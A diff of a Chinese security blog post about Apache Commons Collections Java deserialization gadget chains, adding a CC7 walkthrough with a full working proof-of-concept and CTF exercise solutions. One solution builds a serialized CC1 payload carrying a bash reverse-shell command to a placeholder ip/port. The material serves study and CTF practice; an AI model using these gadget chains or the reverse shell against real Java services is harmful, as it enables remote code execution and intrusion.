@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Java反序列化之CommonsCollections, Ethe&#39;s blog">
+    <meta name="keywords" content="CommonsCollections反序列化链, Ethe&#39;s blog">
     <meta name="description" content="Commons CollectionsApache Commons Collections包和简介 | 闪烁之狐 (blinkfox.github.io)
 背景介绍Apache Commons是Apache软件基金会的项目，曾经隶属于Jak">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -18,7 +18,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Java反序列化之CommonsCollections | Ethe&#39;s blog</title>
+    <title>CommonsCollections反序列化链 | Ethe&#39;s blog</title>
     <link rel="icon" type="image/png" href="https://epicture.oss-cn-beijing.aliyuncs.com/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -322,12 +322,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/20.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/24.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Java反序列化之CommonsCollections</h1>
+                    <h1 class="description center-align post-title">CommonsCollections反序列化链</h1>
                 </div>
             </div>
         </div>
@@ -488,21 +488,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-03-23
+                    2023-05-02
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    11.1k
+                    12.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    50 分
+                    56 分
                 </div>
                 
 
@@ -842,7 +842,7 @@ public class Main &#123;
 <p>ConstantTransformer</p>
 <p> ChainedTransformer</p>
 <p> HashMap</p>
-<h2 id="LazyMap链1"><a href="#LazyMap链1" class="headerlink" title="LazyMap链1"></a>LazyMap链1</h2><p>刚才我们分析完了TransformedMap链，接下来再来看LazyMap</p>
+<h2 id="LazyMap链"><a href="#LazyMap链" class="headerlink" title="LazyMap链"></a>LazyMap链</h2><p>刚才我们分析完了TransformedMap链，接下来再来看LazyMap</p>
 <h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>LazyMap类中的get方法调用了transform方法</p>
 <pre class="language-java" data-language="java"><code class="language-java">public Object get(Object key) &#123;
     &#x2F;&#x2F; create value for key if key is not currently in the map
@@ -1017,7 +1017,7 @@ hashMap.put(tiedMapEntry, &quot;123&quot;);
 ser(decorate);
 unser();</code></pre>
 
-<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>看起来链子很完美，但实际上如果真正运行不会运行成功</p>
+<h2 id="完善-1"><a href="#完善-1" class="headerlink" title="完善"></a>完善</h2><p>看起来链子很完美，但实际上如果真正运行不会运行成功</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320203448437.png" alt="image-20230320203448437"></p>
 <p>他会提示java.lang.ProcessImpl这个类不能进行序列化，为什么会出现这个类呢，原因就是hashMap.put，</p>
 <p>put方法会调用hashCode，然后调用TiedMapEntry类里的get方法，恰好get方法里还有个put</p>
@@ -1116,7 +1116,7 @@ public class HashMapTest &#123;
 <h2 id="动态类加载机制"><a href="#动态类加载机制" class="headerlink" title="动态类加载机制"></a>动态类加载机制</h2><p>在类加载的过程中，我们知道字节码加载过程是</p>
 <p>loadClass -&gt; findClass -&gt; defineClass</p>
 <p>而在<a href="https://ethe448.github.io/2023/03/16/Java/#toc-heading-14">Java | Ethe&#39;s blog (ethe448.github.io)</a>的类加载机制的部分，我们展示了一种通过ClassLoader.defineClass 字节码加载任意类的攻击方式</p>
-<p>不给单纯的调用defineClass是不能执行类的，若要执行就必须先进行实例化</p>
+<p>不过单纯的调用defineClass是不能执行类的，若要执行就必须先进行实例化</p>
 <p>而CC3恰好就是找到了利用defineClass并进行了实例化实现的反序列化攻击</p>
 <h2 id="TemplatesImpl类"><a href="#TemplatesImpl类" class="headerlink" title="TemplatesImpl类"></a>TemplatesImpl类</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321205745553.png" alt="image-20230321205745553"></p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321205923522.png" alt="image-20230321205923522"></p>
@@ -1124,8 +1124,9 @@ public class HashMapTest &#123;
 <p><code>name</code>为类名，<code>b</code>为字节码数组，<code>off</code>为偏移量，<code>len</code>为字节码数组的长度。</p>
 <p>现在我们的 <code>defineClass()</code> 方法的作用域为 <code>protected</code>，我们需要找到作用域为 <code>public</code> 的类，方便我们利用。</p>
 <p>IDEA里右键查找用法</p>
-<p>最后会在TemplatesImpl.TransletClassLoader里找到一个可以利用的地方，这里没有标注作用域，也就是默认的default属性，在同一个包下可以访问</p>
+<p>最后会在TemplatesImpl.TransletClassLoader里的defineClass找到一个可以利用的地方，这里没有标注作用域，也就是默认的default属性，在同一个包下可以访问</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321210813430.png" alt="image-20230321210813430"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230428223705676.png" alt="image-20230428223705676"></p>
 <p>我们再找一下调用它的函数</p>
 <p>又被defineTransletClasses调用了，但是又是个private，所以还要接着找</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321211236734.png" alt="image-20230321211236734"></p>
@@ -1360,7 +1361,7 @@ ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t);</code></
     &#125;
 &#125;</code></pre>
 
-<h2 id="优化-1"><a href="#优化-1" class="headerlink" title="优化"></a>优化</h2><p>但是这里序列化的时候也弹计算器了，原因就是在第二次add的时候，不满足if判断进了siftUp里，然后在siftUp里也有个siftDownUsingComparator，导致提前执行了命令</p>
+<h2 id="完善-2"><a href="#完善-2" class="headerlink" title="完善"></a>完善</h2><p>但是这里序列化的时候也弹计算器了，原因就是在第二次add的时候，不满足if判断进了siftUp里，然后在siftUp里也有个siftDownUsingComparator，导致提前执行了命令</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323212731526.png" alt="image-20230323212731526"></p>
 <p>这里就要用我们熟悉的反射了</p>
 <p>最终poc</p>
@@ -1506,8 +1507,7 @@ public class cc4 &#123;
 <h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><p>CC5的环境又回到了CommonsCollections3</p>
 <p>CommonsCollections1和CommonsCollections3因为AnnotaionInvocationHandler入口在jdk8中代码被修改了导致不能使用，所以CommonsCollections5换了一个入口，在调用链的构造中，也新加了一个TiedMapEntry作为中转。</p>
 <h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>CC5的后半段就是从LazyMap.get到InvokerTransformer.transform</p>
-<p>这里和LazyMap链一样就不细说了，这里就说说前半段，要找到调用get方法的类，在CC6里我们用的是TiredMapEntry类的getValue方法，在CC5里也是它，但是在CC6里用的是它的hashCode</p>
-<p>方法来调用getValue方法，而在CC5里用的是它的toString方法</p>
+<p>这里和LazyMap链一样就不细说了，这里就说说前半段，要找到调用get方法的类，在CC6里我们用的是TiredMapEntry类的getValue方法，在CC5里也是它，但是在CC6里用的是它的hashCode方法来调用getValue方法，而在CC5里用的是它的toString方法</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323220204497.png" alt="image-20230323220204497"></p>
 <p>然后就去找有没有调用toString的（这个可太多了</p>
 <p>在CC5里找的是BadAttributeValueExpException类的readObject方法</p>
@@ -1541,7 +1541,7 @@ public class cc4 &#123;
     &#125;
 &#125;</code></pre>
 
-<h2 id="完善-1"><a href="#完善-1" class="headerlink" title="完善"></a>完善</h2><p>但是实际上上边的poc在序列化过程会执行命令，但是在反序列化过程中反而不会执行</p>
+<h2 id="完善-3"><a href="#完善-3" class="headerlink" title="完善"></a>完善</h2><p>但是实际上上边的poc在序列化过程会执行命令，但是在反序列化过程中反而不会执行</p>
 <p>原因就是在的构造函数里BadAttributeValueExpException</p>
 <pre class="language-java" data-language="java"><code class="language-java">public BadAttributeValueExpException (Object val) &#123;
     this.val &#x3D; val &#x3D;&#x3D; null ? null : val.toString();
@@ -1606,7 +1606,7 @@ public class cc5 &#123;
 <p>这里只要控制m是lazymap类的对象就可以了，这个m也就是我们传入的o</p>
 <p>然后再去找调用了equals方法的类</p>
 <p>cc7里用的是HashTable类的reconstitutionPut方法</p>
-<p><img src="/2023/03/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections/Users/ethe/AppData/Roaming/Typora/typora-user-images/image-20230323230621690.png" alt="image-20230323230621690"></p>
+<p><img src="/2023/03/19/CommonsCollections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/Users/ethe/AppData/Roaming/Typora/typora-user-images/image-20230323230621690.png" alt="image-20230323230621690"></p>
 <p>这里的key是我们可控的，在HashTable的readObject方法里</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323231044314.png" alt="image-20230323231044314"></p>
 <p>这个key是从readObject方法里拿到的，那writeObject里应该也有</p>
@@ -1616,8 +1616,140 @@ public class cc5 &#123;
 <p>那么也就是说key是可控的，key可控所以e.key.equals(key)也可控</p>
 <p>那么m就是我们可控的，然后达到调用lazymap.get的目的</p>
 <h2 id="编写poc"><a href="#编写poc" class="headerlink" title="编写poc"></a>编写poc</h2><p>虽然调用链已经弄清楚了，但是在编写poc之前还有几个要注意的地方</p>
-<p>1.首先创建的Hashtable对象至少要put两次</p>
-<p>因为第一次put时table里是空的，不会进入if判断，而在第二次时，第一次的数据已经进入了table，这时候才会进入if</p>
+<p><strong>1.如何进入reconstitutionPut的for循环中</strong></p>
+<p>因为第一次put时table里是空的，不会进入for循环，而在第二次时，第一次的数据已经进入了table，这时候才会进入for循环</p>
+<p>所以这里至少要put进两个不一样的LazyMap，就相当于有两个不一样的hashMap。（如果传入了相同的值，则 Hashtable#readObject 中的 elements 便会为 1，也就还是不会进入for循环</p>
+<p><strong>2.如何满足e.hash == hash</strong></p>
+<p>首先这里求hash的方法是key.hashCode()，key是我们的HashMap对象，也就是HashMap里的hashCode，可以跟一下最后调用的hashCode是这样的</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230324140606106.png" alt="image-20230324140606106"></p>
+<p>Java的hashCode有点小bug</p>
+<pre class="language-none"><code class="language-none">&quot;yy&quot;.hashCode() &#x3D;&#x3D; &quot;zZ&quot;.hashCode()</code></pre>
+
+<p>所以只要让我们的hashMap的值分别为yy和zZ就能满足e.hash==hash然后去执行&amp;&amp;后面的 e.key.equals(key)了</p>
+<p><strong>3.如何调用AbstractMap这个抽象类里的equals方法</strong></p>
+<p>HashMap源码中的equals()定义是Entry类的，所以如果不是Entry类去调HashMap.equals，调用的其实就是它继承的AbstractMap抽象类里的equals</p>
+<h2 id="完善-4"><a href="#完善-4" class="headerlink" title="完善"></a>完善</h2><p>弹了，但是没完全弹</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230324141012061.png" alt="image-20230324141012061"></p>
+<p>在序列化之前出现了一个无法被反序列化的实例</p>
+<p>根据经验，这个就是因为在构造的时候执行了一遍命令，让其中一个值成为了java.lang.ProcessImpl类型的。</p>
+<p>不出意外的话，还是put问题，我们可以跟一下看看</p>
+<p>果然，在put里调用了LazyMap的equals函数</p>
+<p>但是LazyMap没equals，所以调用了它的父类AbstractMapDecorator里的equals</p>
+<p><img src="/2023/03/19/CommonsCollections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/Users/ethe/AppData/Roaming/Typora/typora-user-images/image-20230324141919251.png" alt="image-20230324141919251"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230324142001699.png" alt="image-20230324142001699"></p>
+<p>然后又调用了HashMap的equals方法，但是HashMap继承了AbstractMap抽象类，这个抽象类中有equals方法，所以就会调用</p>
+<p>AbstractMap的equals方法，导致命令提前执行，并且会让hashmap2的key中就会增加一个yy键，而这个键的值为UNIXProcess这个类的实例：</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230324142852120.png" alt="image-20230324142852120"></p>
+<p>而且在反序列化的时候AbstractMap抽象类的equals会在第三个if判断中会判断Map中元素的个数，由于lazyMap2和lazyMap1中的元素个数不一样则直接返回false，那么也就不会触发漏洞</p>
+<p>所以还要remove掉hashmap2里多出的yy键值对</p>
+<p>还有就是为了不让构造的时候就执行命令，用反射的方式改个值就行，最终payload</p>
+<pre class="language-java" data-language="java"><code class="language-java">package org.cc7;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.HashMap;
+import java.util.Hashtable;
+import java.util.Map;
+
+public class cc7 &#123;
+    public static void main(String[] args) throws Exception &#123;
+        Transformer transformerChain &#x3D; new ChainedTransformer(new Transformer[0]);
+        Transformer[] transformers &#x3D; new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;calc&quot;&#125;),
+        &#125;;
+        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);
+        HashMap&lt;Object, Object&gt; hashMap1 &#x3D; new HashMap&lt;&gt;();
+        HashMap&lt;Object, Object&gt; hashMap2 &#x3D; new HashMap&lt;&gt;();
+        hashMap1.put(&quot;yy&quot;,1);
+        hashMap2.put(&quot;zZ&quot;,1);
+        Map decorate1 &#x3D; LazyMap.decorate(hashMap1, chainedTransformer);
+        Map decorate2 &#x3D; LazyMap.decorate(hashMap2, new ConstantTransformer(&quot;1&quot;));
+        Hashtable&lt;Object, Object&gt; objectObjectHashtable &#x3D; new Hashtable&lt;&gt;();
+        objectObjectHashtable.put(decorate1,1);
+        objectObjectHashtable.put(decorate2,1);
+        hashMap2.remove(&quot;yy&quot;);
+        Class&lt;? extends Map&gt; aClass &#x3D; decorate2.getClass();
+        Field factory &#x3D; aClass.getDeclaredField(&quot;factory&quot;);
+        factory.setAccessible(true);
+        factory.set(decorate2,chainedTransformer);
+        serialize(objectObjectHashtable);
+        unserialize();
+    &#125;
+    public static void serialize(Object obj) throws Exception&#123;
+        ObjectOutputStream oos&#x3D;new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    &#125;
+    public static void unserialize() throws Exception&#123;
+        ObjectInputStream ois&#x3D;new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;)));
+        ois.readObject();
+    &#125;
+&#125;</code></pre>
+
+<h2 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h2><p>作为最后一个CC链，CC7的入口类是Hashtable，执行类依旧是InvokerTransformer</p>
+<p>调用链</p>
+<p>Hashtable.readObject</p>
+<p>Hashtable.reconstitutionPut</p>
+<p>AbstractMap.equals</p>
+<p>LazyMap.get</p>
+<p>InvokerTransformer.transform</p>
+<h1 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h1><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/1.png" alt="image-20230324142852121"></p>
+<p>对于反序列化来说，在调用链上的每个方法看起来是独立的，却又相互联系，通过不同的组合形成能够形成各种不同调用链</p>
+<p>其中比较重要的是</p>
+<p>CC2和CC3属于4.0环境</p>
+<p>其余的属于3.0+版本，</p>
+<p>其中高版本也可用的CC6和4.0版本的CC2是比较重要的</p>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="web847"><a href="#web847" class="headerlink" title="web847"></a>web847</h2><p>题目环境中，没有nc和curl命令，但是有bash，所以反弹shell</p>
+<p>Java7的环境，使用了<strong>commons-collections 3.1</strong>的库</p>
+<p>所以用CC1就行</p>
+<p>把序列化内容写入输出流里，然后base64输出</p>
+<pre class="language-java" data-language="java"><code class="language-java">public class Main &#123;
+    public static void main(String[] args) throws IOException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, ClassNotFoundException &#123;
+        Transformer[] t &#x3D; new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&quot;&#125;&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t);
+
+&#x2F;&#x2F;        InvokerTransformer exec &#x3D; new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);
+
+        HashMap map &#x3D; new HashMap();
+        map.put(&quot;value&quot;,&quot;value&quot;);
+
+
+
+        Map decorate &#x3D; TransformedMap.decorate(map, null, chainedTransformer);
+&#x2F;&#x2F;
+        &#x2F;&#x2F;创建AnnotationinvocationHandler的类对象
+        Class&lt;?&gt; AIH_construct &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        &#x2F;&#x2F;获取构造方法
+        Constructor&lt;?&gt; declaredConstructor &#x3D; AIH_construct.getDeclaredConstructor(Class.class, Map.class);
+        declaredConstructor.setAccessible(true);
+        Object o &#x3D; declaredConstructor.newInstance(Target.class, decorate);
+        ByteArrayOutputStream byteArrayOutputStream &#x3D; new ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(o);
+        byte[] buf &#x3D; byteArrayOutputStream.toByteArray();
+        &#x2F;&#x2F; base64编码
+        Base64.Encoder encoder &#x3D; Base64.getEncoder();
+        String base64 &#x3D; encoder.encodeToString(buf);
+        System.out.println(base64);
+    &#125;</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230326140124579.png" alt="image-20230326140124579"></p>
+<h2 id="web848"><a href="#web848" class="headerlink" title="web848"></a>web848</h2><p>在847的基础上禁止了TransformedMap类</p>
+<p>换成LazyMap就行，一样的东西</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230326141149441.png" alt="image-20230326141149441"></p>
 
                 
             </div>
@@ -1644,7 +1776,7 @@ public class cc5 &#123;
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://Ethe448.github.io/2023/03/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections/">https://Ethe448.github.io/2023/03/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections/</a>
+                    <a href="https://Ethe448.github.io/2023/03/19/CommonsCollections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/">https://Ethe448.github.io/2023/03/19/CommonsCollections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -2131,18 +2263,17 @@ public class cc5 &#123;
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/03/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections/">
+                <a href="/2023/04/10/CVE-2022-22965/">
                     <div class="card-image">
                         
                         
-                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/20.jpg" class="responsive-img" alt="Java反序列化之CommonsCollections">
+                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/9.jpg" class="responsive-img" alt="CVE-2022-22965">
                         
-                        <span class="card-title">Java反序列化之CommonsCollections</span>
+                        <span class="card-title">CVE-2022-22965</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -2152,9 +2283,9 @@ public class cc5 &#123;
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-19
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-04-10
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -2162,23 +2293,6 @@ public class cc5 &#123;
                             
                         </span>
                     </div>
-                </div>
-
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
-                        <span class="chip bg-color">web学习</span>
-                    </a>
-                    
-                    <a href="/tags/Java/">
-                        <span class="chip bg-color">Java</span>
-                    </a>
-                    
-                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-                        <span class="chip bg-color">反序列化</span>
-                    </a>
-                    
                 </div>
                 
             </div>
@@ -2190,13 +2304,13 @@ public class cc5 &#123;
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/03/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS/">
+                <a href="/2023/03/18/URLDNS%E9%93%BE/">
                     <div class="card-image">
                         
                         
-                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/20.jpg" class="responsive-img" alt="Java反序列化之URLDNS">
+                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/21.jpg" class="responsive-img" alt="URLDNS链">
                         
-                        <span class="card-title">Java反序列化之URLDNS</span>
+                        <span class="card-title">URLDNS链</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -2433,7 +2547,7 @@ $(function () {
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">195.4k</span>
+                        class="white-color">231k</span>
             
             
             
